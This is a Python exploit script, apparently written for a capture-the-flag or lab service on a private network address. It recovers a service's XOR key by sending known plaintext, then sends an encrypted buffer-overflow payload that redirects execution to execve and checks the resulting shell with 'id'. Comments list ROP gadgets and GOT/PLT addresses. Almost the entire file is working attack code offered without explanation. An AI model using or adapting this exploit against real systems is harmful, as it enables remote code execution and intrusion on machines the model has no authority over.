#!/usr/bin/env python
# &keyed = 0x0804b460
# &keybuf = 0x0804b480
# stack+0xc - &system = 0x13b804

import socket
import struct
import time
import logging

#logging.basicConfig(level=logging.DEBUG)

def purge_banner(s):
  logging.debug(repr(s.recv(1024)))
  logging.debug(repr(s.recv(1)))

def encrypt(p, k):
  # p is char*
  # k is uint[32]
  l = len(p)
  blocks = l/4.
  if l & 3: 
    blocks += 1  
  logging.debug("blocks=" + str(blocks))
  c_p = ""
  for i in range(int(blocks)):
    e = struct.unpack("I", p[4*i:4*(i+1)])[0] ^ k[i % 32]
    c_p += struct.pack("I", e)
  return c_p

def retrieve_xor_key(s):
  plain_text = "AAAA" * 32
  s.send("E")
  s.send(struct.pack("I", len(plain_text)))
  s.send(plain_text)
  purge_banner(s)
  l = struct.unpack("I", s.recv(4))[0]
  x = s.recv(1024)
  if l != len(x):
    raise Exception(str(l) + str(len(x)))
  o_c = struct.unpack("I", "AAAA")[0]
  key = []
  for i in range(32):
    key.append(o_c ^ struct.unpack("I", x[4*i:4*(i+1)])[0])
  return key

s = socket.create_connection(("192.168.122.37", "20002"))
purge_banner(s)
key = retrieve_xor_key(s)
logging.debug(key)
shellcode ="/bin/bash/\0WWWWW" + "A" * (4096*32 - 16) + "B"*16 + "\xb6\x89\x04\x08" + "" + "\x80\xb4\x04\x08" * 2 + "\x00\x00\x00\x00"
cipher_shellcode =  encrypt(shellcode, key)
logging.debug(cipher_shellcode)
s.send("E")
s.send(struct.pack("I", len(cipher_shellcode)))
s.send(cipher_shellcode)
purge_banner(s)
l = struct.unpack("I", s.recv(4))[0]
x = ""
print len(shellcode), len(cipher_shellcode)
while len(x) < len(cipher_shellcode):
  x += s.recv(128)
  print len(x)
print repr(x[-16:])
s.send("Q")
s.send("id\n")
print s.recv(1024)


# gadget we have:
# 0x08048b7f: sub $0xc9ffffffd, %eax | ret
# 0x080491d7: and al, 0e8h           | ret
# 0x080499d3: sbb al,24h             | ret

# execve.got.plt => 0x0804b3d8
# execve.plt     => 0x080489b6
